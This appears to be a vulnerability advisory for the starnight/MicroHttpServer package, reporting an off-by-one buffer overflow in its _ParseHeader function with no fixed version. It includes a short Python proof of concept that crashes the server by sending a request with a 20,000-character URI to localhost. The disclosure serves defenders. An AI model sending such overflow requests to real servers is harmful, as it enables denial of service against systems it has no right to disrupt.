remediation: There is no fixed version for starnight/MicroHttpServer .
title: Off-by-one Error

vulnDescription.Overview: Affected versions of this package are vulnerable to Off-by-one Error in the _ParseHeader function. An attacker can cause a buffer overflow by sending a request with a long URI.
vulnDescription.PoC:
import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(("localhost", 8001)) sock.send(b"GET "+b"?"*20000+b"HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1


") response = sock.recv(4096) sock.close()
